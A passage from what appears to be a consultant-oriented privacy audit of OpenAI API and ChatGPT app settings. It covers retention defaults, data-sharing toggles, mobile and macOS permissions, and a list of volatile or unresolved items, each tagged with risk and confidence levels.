- **Setting:** `Share inputs and outputs with OpenAI`
- **Where:** Settings → Organization → Data controls → Sharing
- **Default:** **Disabled.** *"By default, data sharing for inputs and outputs is disabled for all organizations."* Org **owner** required. Not available to Enterprise or ZDR orgs.
- **Exposes:** When enabled, inputs and outputs are used *"to… inform future evaluation and training of models"* — **this is the switch that puts client prompts into OpenAI's training pipeline.**
- **Recommend:** **Disabled.** The incentive is complimentary daily tokens, but the article requires you to *"confirm that you have the appropriate permissions for OpenAI to process and use this data"* — which, for client data, **you almost certainly do not hold.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** `Share evaluation and fine-tuning data with OpenAI`
- **Default:** **Disabled.** Org owner only; unavailable to ZDR orgs.
- **Recommend:** **Disabled. Fine-tuning datasets are the most concentrated form of client IP you will ever hand a vendor.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** `Share model feedback via Playground`
- **Default:** **Disabled.** *"The ability to share feedback via the playground is disabled by default for all organizations."*
- **Exposes:** When enabled, **any org member** sees a thumbs-down in the Playground; clicking it shares *"the conversation up to that point (including inputs, outputs, and files uploaded)"* — **a one-click training-data donation by a non-admin.**
- **Recommend:** **Disabled.** The one where a junior dev can leak a client prompt without malice or admin rights.
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** Logs page visibility — can org members read each other's prompts?
- **Default:** Shows stored Responses (**anything with `store=true`, the default**) for 30 days, plus agent sessions and traces.
- **Exposes:** ⚠️ **Yes — other project members can read your prompts and completions.** RBAC has **no separate "Logs" permission**; the gate is the **Responses API `Read`** permission: *"The same permissions govern both surfaces."*
- **Recommend:** Three mitigations in order: set `store=false` so there is nothing to browse; grant Write-without-Read where the role model allows; **isolate sensitive workloads into their own project so the member list is the blast radius.** This is the main *internal* exposure, distinct from OpenAI-side retention.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Agent tracing
- **Default:** **Enabled.** *"Tracing is enabled by default for new sessions."* The dashboard *"shows what your agent did, including each step's recorded inputs, outputs, duration, and status."* For MCP tool calls, the Call panel records the **full `arguments`**.
- **Exposes:** Every agent run's inputs and outputs — including MCP tool-call arguments — recorded and browsable by anyone with trace/Responses read access. `/v1/agents` application state is **Until deleted** and **ZDR-ineligible**, so traces persist indefinitely.
- **Recommend:** **Treat agent traces as a primary leak surface, not a debugging convenience.** Scope `api.traces.read` tightly; delete agent sessions on a schedule. **No documented way to disable tracing** and **no stated trace retention window** were found.
- **Risk:** High
- **Confidence:** `verified` (default-on, content recorded); **`unresolved` (how to disable; retention window)**

- **Setting:** Conversations API — **no TTL**
- **Default:** **"Until deleted" for BOTH abuse monitoring and application state**, and ZDR-ineligible. *"Conversation objects and items in them are not subject to the 30 day TTL. Any response attached to a conversation will have its items persisted with no 30 day TTL."*
- **Exposes:** **Attaching a response to a conversation converts a 30-day-expiring record into an indefinitely retained one, in both application state and the abuse log, and ZDR cannot stop it.**
- **Recommend:** Do not use `/v1/conversations` or `/v1/chatkit/threads` for client or personal data. Manage conversation state yourself with `previous_response_id` plus `store=false`. **The least-known high-risk default on the platform.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Assistants, Threads, Vector Stores, Files, Batch, Fine-tuning retention
- **Default:** All: abuse monitoring 30 days; **application state "Until deleted"; ZDR-ineligible.** *"Objects related to the Assistants API are deleted from our servers 30 days after you delete them… Objects that are not deleted via the API or dashboard are **retained indefinitely**."* Files have **no automatic expiry unless you set `expires_after`.**
- **Exposes:** Every thread message and every vector-store chunk of every uploaded client document persists indefinitely unless explicitly deleted.
- **Recommend:** Build explicit deletion into any Assistants or vector-store workflow; **always set `expires_after` on upload.** Deleting a fine-tuning job is **not** deleting its data. **EKM does not support Assistants at all.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** `prompt_cache_retention` / `prompt_cache_options.ttl`
- **Default:** *"Organizations without Zero Data Retention enabled default to `24h`. Organizations with Zero Data Retention enabled default to `in_memory`."* For GPT-5.6+, `ttl` supports only `"30m"`. On `gpt-5.5`/`gpt-5.5-pro`, setting `in_memory` **returns an error** — 24h is forced.
- **Recommend:** Set `in_memory` on supported earlier models for sensitive workloads. **Note you cannot on `gpt-5.5`/`gpt-5.5-pro`, and GPT-5.6+ offers nothing shorter than 30m — a privacy option that existed and was removed.**
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** `external_web_access` *(Responses `web_search` tool)*
- **Default:** **`true`** (live internet). *"Web Search with live internet access is not HIPAA eligible and is not covered by a BAA."*
- **Recommend:** Use `web_search` (not `web_search_preview`) with `external_web_access: false` for regulated work. ⚠️ **Warning:** *"Preview variants (`web_search_preview`) ignore this parameter and behave as if `external_web_access` is `true`."*
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** `store` on `/v1/live/sessions`
- **Default:** **Session storage is disabled by default.** With it on, `store: true` retains the completed session **audio recording** for 30 days.
- **Recommend:** Leave off. ⚠️ **Critical gotcha:** *"Setting `store: false` on a fork prevents storage of the new session; it does not delete the source recording... The API does not provide a public stored-session deletion endpoint."* **There is no way to delete a stored Live session — only the 30-day expiry.**
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** Audit logging *(API Platform)*
- **Default:** **Off until enabled.** Only org owners can create the Admin key.
- **Exposes:** **Administrative metadata only** — *"They are separate from API request and response customer content,"* and *"Zero Data Retention does not change the availability, retention behavior, or event contents of API Platform audit logs."*
- **Recommend:** **Enable it** — no customer-content exposure, and it is your only record of who changed the retention settings above. **But export it yourself:** *"API Platform audit logs do not currently have a fixed retention period or configured TTL. OpenAI retains these audit logs on a best-effort basis."*
- **Risk:** Low
- **Confidence:** `verified` (content, retention, ZDR interaction); `reported` (enable click path)

- **Setting:** Data residency *(project region + domain prefix)*
- **Default:** **Global** — no regional constraint. Approval-gated. **10% pricing uplift** on residency endpoints for models released on or after 2026-03-05.
- **Exposes:** Residency does **not** cover system data — account data, metadata, usage, billing, support requests, **and structured output schema.**
- **Recommend:** Ten regions exist, but **only US, EU and UAE support regional *processing*.** Australia, Canada, Japan, India, Singapore, South Korea, UK are **storage-only** — and *"OpenAI may also process and temporarily store Customer Content outside of the Region."* **Any non-US region requires MAM/ZDR approval.** Two endpoint limits: **you cannot set `store=true` on `/v1/chat/completions` in non-US regions**, and tracing is not EU-residency compliant for `/v1/realtime`.
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** Enterprise Key Management (EKM / BYOK)
- **Default:** **Off.** When on, EKM *"applies to any application state created during your use of the platform"*, encrypted under keys in your own AWS KMS, GCP or Azure Key Vault.
- **Recommend:** Enable if you have the KMS maturity — it gives you cryptographic revocation. **Assistants is unsupported and errors in an EKM-enabled project.**
- **Risk:** Low *(as a control)*; Medium if you assume it covers everything
- **Confidence:** `verified` (scope, limitations); `unresolved` (exact dashboard click path)

## 10. Mobile & OS app permissions

- **Setting:** Apple App Store privacy label
- **Where:** https://apps.apple.com/us/app/chatgpt/id6448311069 → App Privacy. Seller **OpenAI OpCo, LLC**; version **1.2026.267**.
- **Default:** **There is NO "Data Used to Track You" section** — the word "Track" appears nowhere on the listing. Only **"Data Linked to You"**: **Health & Fitness** (Health, Fitness); **Location** (Coarse); Contact Info (Email, Name, Phone); **User Content** (Audio Data, Customer Support, Other User Content); **Search History**; Identifiers (User ID, Device ID); Usage Data; Diagnostics. Declared purposes include **Third-Party Advertising**.
- **Exposes:** Two things worth flagging: **Health & Fitness is now a linked category**, and **Audio Data is explicitly linked to identity.** Note the oddity: Apple normally requires data used for *Third-Party Advertising* to be declared under "Data Used to Track You," **yet no such section exists here.**
- **Risk:** Medium
- **Confidence:** `verified` (category list and the absence of a tracking section, both read live)

- **Setting:** Google Play Data safety
- **Where:** https://play.google.com/store/apps/datasafety?id=com.openai.chatgpt. Listing updated 2026-10-02.
- **Default:** **Shared with third parties:** *Device or other IDs* only. **Collected:** Name; Email address (incl. *Advertising or marketing*); Address and Phone (optional); Crash logs, Diagnostics; **Location — Approximate only**; App interactions; Other user-generated content; Other in-app messages. Security: *"Data is encrypted in transit"*; *"You can request that data be deleted."*
- **Exposes:** ⚠️ **A discrepancy worth raising:** Play declares **only approximate location**, while the ChatGPT Android FAQ says precise location *is* collected if you enable precise sharing. One of the two is incomplete. Also **no "encrypted at rest" claim** is made.
- **Recommend:** Rely on OS-level permission settings, not the store declaration.
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** Location *(and precise location)*
- **Where:** Settings → Data controls → Location. **Mobile-first** — did not render in the live web pane.
- **Default:** **Device location sharing is optional and off by default.** But **coarse location is always on and not optional**: *"ChatGPT may use an approximate location based on your IP address to provide relevant local results."* **Precise location sharing is not available in ChatGPT Enterprise workspaces.**
- **Exposes:** At default, your **IP-derived city-level location is shared with third-party search providers** — OpenAI's example rewrites "restaurants near me" into "top restaurants San Francisco" for the partner (named: **Microsoft**, **Shopify**). OpenAI does **not** share the IP itself. If you opt into device location, precise location is not separately stored, but *"Information included in ChatGPT's response, such as nearby places, will remain in your chat history until you delete it."*
- **Recommend:** Leave device location off and type a city when you need local results. **Understand that coarse location cannot be turned off — only a VPN changes it.**
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** Contact importing
- **Where:** Controlled **only through device settings** — **no in-app toggle is documented.**
- **Default:** **Optional / opt-in.**
- **Exposes:** Phone numbers from your device address book are uploaded, **hashed**, and matched against OpenAI accounts on an ongoing basis. *"We only use phone numbers. We don't upload contact names or full address books."* Contact lists are deleted after matching, but *"Coded (or hashed) phone numbers may be kept on OpenAI's servers to support connection features."* If you follow someone, **they get notified.**
- **Recommend:** **Deny Contacts at the OS level.** For a consultant this uploads your **client roster's phone numbers**; hashing is not an adequate control for that, and **there is no documented delete path for the retained hashes.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** iOS "Allow Tracking" / App Tracking Transparency
- **Default:** **`unresolved`.** No OpenAI statement on ATT could be found. The strongest signal is that the App Store listing carries **no "Data Used to Track You" section**, which under Apple's rules implies ChatGPT does not track as Apple defines it. **The complication:** the same listing declares a *Third-Party Advertising* purpose, and the privacy policy says *"We receive information from advertisers and other data partners."*
- **Recommend:** Set iOS → Privacy & Security → Tracking → **Allow Apps to Request to Track = Off** globally regardless. **Flag this as genuinely unresolved rather than guessing.**
- **Risk:** Medium
- **Confidence:** `unresolved`

- **Setting:** Android OS runtime permission manifest
- **Default:** **`unresolved`** — the Play web listing does not expose the full manifest. Confirmed requested in practice from OpenAI's own docs: **Microphone**, **Camera**, **Location** (opt-in), **Contacts** (opt-in), **Notifications**. OpenAI states: *"by default our Android App doesn't access your device's Location, Bluetooth, or other services to collect or approximate your precise location data."*
- **Recommend:** Audit per-permission in OS settings rather than trusting the store listing. **Photos** and **Local Network** specifically are `unresolved`.
- **Risk:** Medium
- **Confidence:** `verified` (named permissions); `unresolved` (complete list)

- **Setting:** `Enable Work with Apps` *(macOS desktop)*
- **Where:** macOS app → Settings → Work with Apps. Requires System Settings → Privacy & Security → **Accessibility** → ChatGPT for most apps.
- **Default:** `unresolved` for the switch. **Gating is verified:** it cannot read anything until you add an app *and* grant Accessibility. **Admin-lockable.**
- **Exposes:** ChatGPT reads **the last 200 lines of open panes** in Apple Notes, Notion, TextEdit, Quip, Xcode, Script Editor, VS Code/Cursor/Windsurf/VSCodium, the JetBrains family, **and Terminal, iTerm, Warp, Prompt.** That content *"becomes part of your chat history and is saved in your account,"* and *"We may use the content included to improve our model performance."* With IDEs it can also **write edits** to open files.
- **Recommend:** Off, or at minimum revoke Accessibility. ⚠️ **Terminal scrollback is the sharp edge** — 200 lines of a terminal routinely contains tokens, connection strings and `.env` contents, **and it lands in trainable chat history.**
- **Risk:** High
- **Confidence:** `verified` (behavior, paths, admin locks); `unresolved` (switch default)

- **Setting:** macOS Screen & System Audio Recording permission
- **Where:** System Settings → Privacy & Security → Screen & System Audio Recording → ChatGPT
- **Default:** Not granted until you grant it.
- **Exposes:** ⚠️ **One macOS grant unlocks both window screenshots and ChatGPT Record's system-audio capture** — i.e. granting it for a screenshot also enables recording everyone on your calls.
- **Recommend:** Grant only while actively needed, then revoke. **A single coarse grant covering screen *and* audio, and most people grant it for the narrower purpose.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** `Confirm ChatGPT Requests` *(Siri / Apple Intelligence)*
- **Where:** iOS → Settings → Apple Intelligence & Siri → ChatGPT → Confirm ChatGPT Requests
- **Default:** **ON** — *"By default, Siri will request confirmation before tapping into ChatGPT."*
- **Exposes:** Turning it off lets Siri silently forward queries to OpenAI with no per-request prompt. Even off, *"Siri will always ask permission before sending a file to ChatGPT."*
- **Recommend:** **Leave ON. The one Apple-side default that is already privacy-correct — the only move available is to break it.**
- **Risk:** Medium *(High if disabled)*
- **Confidence:** `verified`

- **Setting:** ChatGPT extension setup *(Apple Intelligence)* — with or without an account
- **Where:** Settings → Apple Intelligence & Siri → ChatGPT → Set Up
- **Default:** **Off until set up.** Two paths: *"Use ChatGPT without an account"* or *"Use ChatGPT with an Account."*
- **Exposes:** *"To save your chats to your ChatGPT history, you must be signed into an account."* Signed in → Siri and Writing Tools requests land in your ChatGPT history **including training.** Without an account → not saved to history.
- **Recommend:** **If you use it, use it without an account**, so Siri traffic does not merge into your ChatGPT history and training pool. `unresolved`: no OpenAI statement on retention for the no-account path.
- **Risk:** Medium
- **Confidence:** `verified` (setup, history behavior); `unresolved` (no-account retention)

- **Setting:** Visual Intelligence → ChatGPT
- **Default:** Requires the ChatGPT extension to be set up first; no separate toggle documented.
- **Exposes:** Camera imagery of *"the places and objects around you"* is sent to ChatGPT. **OpenAI's article documents no retention or training behavior for this path.**
- **Recommend:** Treat as an image upload: if signed in, assume it enters chat history under your normal data controls.
- **Risk:** Medium
- **Confidence:** `verified` (flow); `unresolved` (retention/training)

- **Setting:** Notification channels
- **Where:** Settings → Notifications. Verified live: Codex, Group chats, Health, Library, Marketing, Personalized tips, Projects, Responses, Tasks, Usage.
- **Default:** `unresolved` per channel.
- **Exposes:** Two matter. **Marketing** ties to the privacy policy's direct-marketing purpose. **Personalized tips** — *"Get helpful recommendations based on your conversations with ChatGPT"* — means **your conversation content drives outbound push and email.**
- **Recommend:** Turn off **Marketing** and **Personalized tips**.
- **Risk:** Low
- **Confidence:** `verified` (channels, labels); `unresolved` (defaults)

- **Setting:** `Work network access` / `Reset ChatGPT Work`
- **Where:** Settings → Data controls. Verified live; appears only on accounts with ChatGPT Work.
- **Default:** `unresolved`
- **Exposes:** **`unresolved`** — the controls and their exact labels are verified live, but **no help-center article defines what network access they grant.** Do not characterize it without further checking.
- **Recommend:** **Worth a dedicated follow-up** — an undocumented network-scoped permission sitting in Data controls is exactly the kind of thing to resolve before advising a client.
- **Risk:** `unresolved`
- **Confidence:** `verified` (exists, label); `unresolved` (effect)

> **Privacy Center** (new, mid-rollout) is the best starting point for a consumer audit: web — account menu → Help → Privacy center; mobile — Settings → Privacy Center. It organizes Memory, Personalized ads, Location, Temporary chat, Plugins & apps, MFA, Model improvement, and Export/delete, with **Manage** links into the real settings. **Rolling out to Free, Go, Plus, Pro and Business; excluded from Enterprise, Edu and Healthcare.** `verified`

## Volatile

### Products retired or retiring — highest-priority staleness risk

1. **ChatGPT agent / agent mode — retired.** Replaced by ChatGPT Work + cloud browser.
2. **ChatGPT Atlas — stopped working 2026-08-09.** Its help articles are **still live with no deprecation banner** and show recent "Updated" dates. **Anyone reading them today will configure a dead product.**
3. **Sora — discontinued.** The cameo likeness-consent model no longer exists; likeness moved to **Reference photos** with weaker controls. **The biggest substantive privacy regression in the set.**
4. **Custom GPTs retiring** — new creation ends 2026-10-26, Enterprise retirement 2026-12-11.
5. **Group chats** winding down from 2026-07-09.
6. **Codex Cloud (Legacy)** explicitly marked *"We plan to deprecate this experience"* — the whole agent-internet-access control set lives there.
7. **ChatGPT Team → Business** rename (2025-08-29) invalidates most older admin writeups.

### Defaults that already flipped, or are staged to

8. **Improved memory turned ON by default for Enterprise/Edu** after a two-week early-access window. **The clearest example of a default flipping toward disclosure — assume others will.**
9. **External access permissions are explicitly in "admin preview" and off by default.** Preview defaults frequently flip on at GA, as improved memory did.
10. **ChatGPT for Word** was slated to become **enabled by default 2026-10-01** — yesterday. **Verify its current state.**
11. **Codex `web_search` default changed to `cached`** (a deliberate anti-injection move) — but `--yolo` silently flips it back to `live`.
12. **Codex `approval_policy = "untrusted"` retired** and can now prevent Codex/ChatGPT Work from starting.
13. **Individual-user connector sync retired** — existing disabled 2026-08-14.

### Brand-new surfaces with thin or absent documentation

14. **Ads launched 2026-02-09 (US).** Entirely new control group. **No published defaults.** EEA/Switzerland rollout pending.
15. **Privacy Center** is new and mid-rollout; paths will shift.
16. **Lockdown Mode**, **Computer Use**, **Locked use**, **Computer History**, **site tools / WebMCP**, the **five-browser extension**, **ChatGPT Space**, **Sites**, **Shareable profiles**, **Teams** and **Skills** are all new surface in the last year.
17. **Contact importing** is new, tied to group chats, with **no in-app toggle** and retained hashed phone numbers — **and group chats are themselves being retired**, so the feature's rationale is in flux.
18. **ChatGPT Health appears to be emerging** — "Health & Fitness" is now an App Store *Data Linked to You* category and a **Health** notification channel exists in-app, with **no explanatory help article.**
19. **Reference photos** has no documented training-exclusion statement. For a biometric-adjacent store, that gap is likely to be filled — in one direction or the other.

### Docs in visible disagreement with themselves

20. **Plugin permission labels are mid-migration** — three different label sets for one setting across the admin article, a release note, and the live UI.
21. **Business admin visibility into member chats:** `openai.com/enterprise-privacy/` and the help center **directly contradict each other.** Get it in writing.
22. **iOS App FAQ speech-to-text answers are stale** and contradict the Voice Dictation FAQ on audio retention.
23. **Workspace retention has no documented self-serve UI** despite OpenAI asserting admin control.
24. **OpenAI's own NYT page cites a URL that 404s** — a broken citation inside their primary privacy-messaging page.

### Likely to move next

25. **The Responses API `store=true` default** is the sharpest mismatch on the platform between documented default and user expectation.
26. **ZDR/MAM remain sales-gated with no self-serve path.**
27. **`prompt_cache_options.ttl` accepts exactly one value (`"30m"`)** — a parameter with one legal value is usually about to get more.
28. **Elevated Risk labels are explicitly temporary.**
29. **The NYT April–September 2025 legal hold** — OpenAI says it *"will continue to fight."* The 20-million-log production status is unknown, and the MDL added plaintiffs through 2026, so **nothing structurally prevents a future preservation motion reaching API data again.**
30. **The built-in browser article was updated ~22 hours** before this check, and app permissions ~18 hours. **Both move weekly.**

### Open items — do not present as known

- Codex **GitHub OAuth / App scopes** — no doc enumerates them; both candidate URLs 404. **Do not assume read-only.**
- Current **Codex Cloud internet-access default**.
- **How to disable agent tracing**, and any trace-specific retention window.
- Whether the **thumbs-up/down training carve-out applies inside managed workspaces**.
- **Work network access / Reset ChatGPT Work** — what they actually do.
- Whether **Reference photos** are used in model training.
- iOS **ATT** behavior; the complete **Android manifest**; **Photos** and **Local Network** permissions.
- Retention for the **no-account Siri path** and for **Visual Intelligence**.
- **Third-party security research on prompt injection** — the research pass exhausted its search budget before an independent sweep; **no journalism findings are reported in this file.**
